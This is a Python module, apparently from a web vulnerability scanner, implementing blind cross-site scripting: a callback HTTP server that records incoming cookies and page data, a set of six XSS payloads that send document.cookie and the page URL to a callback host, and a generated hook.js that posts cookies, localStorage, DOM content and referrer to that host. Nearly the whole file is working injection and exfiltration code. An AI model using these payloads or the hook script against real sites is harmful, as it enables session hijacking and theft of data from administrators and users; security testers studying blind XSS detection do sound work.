"""
Blind XSS Module with Callback Server
Injects payloads that phone home when executed in contexts
like admin panels, email viewers, or log dashboards.
"""

import time
import hashlib
import threading
import json
from typing import List, Dict, Optional
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
from colorama import Fore, Style


class BlindXSSCallback:
    """Tracks blind XSS callbacks"""

    def __init__(self):
        self.callbacks: List[Dict] = []
        self.lock = threading.Lock()

    def add(self, data: Dict):
        with self.lock:
            self.callbacks.append(data)

    def get_all(self) -> List[Dict]:
        with self.lock:
            return list(self.callbacks)


class CallbackHandler(BaseHTTPRequestHandler):
    """HTTP handler for blind XSS callback server"""

    callback_store: BlindXSSCallback = None
    verbose: bool = False

    def do_GET(self):
        """Handle GET callbacks from blind XSS payloads"""
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)

        callback_data = {
            'timestamp': datetime.now().isoformat(),
            'path': self.path,
            'marker': params.get('m', ['unknown'])[0],
            'cookie': params.get('c', [''])[0],
            'url': params.get('u', [''])[0],
            'referrer': self.headers.get('Referer', ''),
            'user_agent': self.headers.get('User-Agent', ''),
            'origin': self.client_address[0],
        }

        if self.callback_store:
            self.callback_store.add(callback_data)

        if self.verbose:
            print(f"\n  {Fore.RED}[BLIND XSS] Callback received! Marker: {callback_data['marker']}{Style.RESET_ALL}")
            print(f"  {Fore.RED}[BLIND XSS] From: {callback_data['url']}{Style.RESET_ALL}")

        # Respond with 1x1 pixel GIF
        self.send_response(200)
        self.send_header('Content-Type', 'image/gif')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        # 1x1 transparent GIF
        self.wfile.write(b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x00\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;')

    def do_POST(self):
        """Handle POST callbacks with more data"""
        content_length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_length).decode('utf-8', errors='replace')

        try:
            data = json.loads(body)
        except json.JSONDecodeError:
            data = {'raw': body}

        callback_data = {
            'timestamp': datetime.now().isoformat(),
            'path': self.path,
            'data': data,
            'referrer': self.headers.get('Referer', ''),
            'user_agent': self.headers.get('User-Agent', ''),
            'origin': self.client_address[0],
        }

        if self.callback_store:
            self.callback_store.add(callback_data)

        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(b'ok')

    def do_OPTIONS(self):
        """Handle CORS preflight"""
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()

    def log_message(self, format, *args):
        """Suppress default logging"""
        pass


class BlindXSSScanner:
    """Manages blind XSS payload injection and callback monitoring"""

    def __init__(self, config, callback_url: Optional[str] = None, callback_port: int = 8888):
        self.config = config
        self.callback_port = callback_port
        self.callback_url = callback_url
        self.callback_store = BlindXSSCallback()
        self.server: Optional[HTTPServer] = None
        self.server_thread: Optional[threading.Thread] = None
        self.injected_markers: Dict[str, Dict] = {}

        # If no external callback URL, use local server
        if not self.callback_url:
            self.callback_url = f"http://YOUR_SERVER_IP:{self.callback_port}"

    def start_callback_server(self) -> bool:
        """Start the local callback server"""
        try:
            CallbackHandler.callback_store = self.callback_store
            CallbackHandler.verbose = self.config.verbose

            self.server = HTTPServer(('0.0.0.0', self.callback_port), CallbackHandler)
            self.server_thread = threading.Thread(target=self.server.serve_forever, daemon=True)
            self.server_thread.start()

            print(f"  {Fore.GREEN}[Blind XSS] Callback server started on port {self.callback_port}{Style.RESET_ALL}")
            return True
        except OSError as e:
            print(f"  {Fore.YELLOW}[Blind XSS] Could not start callback server: {e}{Style.RESET_ALL}")
            return False

    def stop_callback_server(self):
        """Stop the callback server"""
        if self.server:
            self.server.shutdown()
            print(f"  {Fore.CYAN}[Blind XSS] Callback server stopped{Style.RESET_ALL}")

    def generate_marker(self, url: str, param: str) -> str:
        """Generate unique marker for tracking"""
        unique = hashlib.md5(f"blind:{url}:{param}:{time.time()}".encode()).hexdigest()[:10]
        return unique

    def get_payloads(self, url: str, param: str) -> List[Dict]:
        """Generate blind XSS payloads with callback URLs"""
        marker = self.generate_marker(url, param)
        cb = self.callback_url

        payloads = [
            {
                'payload': f'"><img src={cb}/x?m={marker}&u='+f'document.location>',
                'type': 'Blind XSS - IMG Callback',
                'severity': 'Critical',
                'marker': marker
            },
            {
                'payload': f'"><script src={cb}/hook.js?m={marker}></script>',
                'type': 'Blind XSS - External Script',
                'severity': 'Critical',
                'marker': marker
            },
            {
                'payload': f'"><img src=x onerror="new Image().src=\'{cb}/x?m={marker}&c=\'+document.cookie">',
                'type': 'Blind XSS - Cookie Exfil',
                'severity': 'Critical',
                'marker': marker
            },
            {
                'payload': f'<script>fetch("{cb}/x?m={marker}&u="+encodeURIComponent(location.href)+"&c="+document.cookie)</script>',
                'type': 'Blind XSS - Fetch Callback',
                'severity': 'Critical',
                'marker': marker
            },
            {
                'payload': f'"><svg onload="new Image().src=\'{cb}/x?m={marker}&u=\'+location.href">',
                'type': 'Blind XSS - SVG Callback',
                'severity': 'Critical',
                'marker': marker
            },
            {
                'payload': f'<input onfocus="fetch(\'{cb}/x?m={marker}&c=\'+document.cookie)" autofocus>',
                'type': 'Blind XSS - Input Focus',
                'severity': 'Critical',
                'marker': marker
            },
        ]

        # Track markers
        for p in payloads:
            self.injected_markers[marker] = {
                'url': url,
                'parameter': param,
                'payload': p['payload'],
                'type': p['type'],
                'injection_time': datetime.now().isoformat()
            }

        return payloads

    def get_callbacks(self) -> List[Dict]:
        """Get all received callbacks"""
        return self.callback_store.get_all()

    def get_confirmed_vulnerabilities(self) -> List[Dict]:
        """Convert callbacks into confirmed vulnerability reports"""
        vulnerabilities = []

        for callback in self.callback_store.get_all():
            marker = callback.get('marker', '')
            injection_info = self.injected_markers.get(marker, {})

            vuln = {
                'type': injection_info.get('type', 'Blind XSS'),
                'severity': 'Critical',
                'url': injection_info.get('url', 'Unknown'),
                'parameter': injection_info.get('parameter', 'Unknown'),
                'payload': injection_info.get('payload', ''),
                'method': 'Blind XSS Callback',
                'detection_method': 'Out-of-Band Callback Received',
                'callback_time': callback['timestamp'],
                'callback_from': callback.get('url', callback.get('referrer', 'Unknown')),
                'exfiltrated_cookie': callback.get('cookie', ''),
                'timestamp': callback['timestamp']
            }
            vulnerabilities.append(vuln)

        return vulnerabilities

    def generate_hook_js(self) -> str:
        """Generate a JavaScript hook file for the callback server"""
        return f"""
// Blind XSS Hook - Auto-generated
(function() {{
    var cb = "{self.callback_url}";
    var data = {{
        url: location.href,
        cookie: document.cookie,
        dom: document.documentElement.innerHTML.substring(0, 500),
        localStorage: JSON.stringify(localStorage),
        referrer: document.referrer,
        title: document.title
    }};
    
    // Send via fetch
    try {{
        fetch(cb + "/hook", {{
            method: "POST",
            headers: {{"Content-Type": "application/json"}},
            body: JSON.stringify(data),
            mode: "no-cors"
        }});
    }} catch(e) {{
        // Fallback to image beacon
        new Image().src = cb + "/x?u=" + encodeURIComponent(data.url) + "&c=" + encodeURIComponent(data.cookie);
    }}
}})();
"""
